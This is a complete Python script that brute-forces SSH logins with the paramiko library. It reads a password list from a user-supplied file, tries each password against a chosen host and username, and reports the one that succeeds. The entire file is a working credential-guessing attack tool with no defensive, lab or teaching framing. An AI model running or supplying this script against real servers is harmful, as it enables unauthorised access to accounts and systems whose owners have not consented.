import paramiko

def ssh_brute_force(hostname, port, username, password_file):
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname, port=port, username=username, password=password)
                print(f"Password found: {password}")
                break
            except paramiko.AuthenticationException:
                print(f"Failed password attempt: {password}")
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    hostname = input("Enter SSH server IP address or hostname: ")
    port = int(input("Enter SSH port (default is 22): ") or "22")
    username = input("Enter SSH username: ")
    password_file = input("Enter the path to the text file containing passwords: ")

    ssh_brute_force(hostname, port, username, password_file)
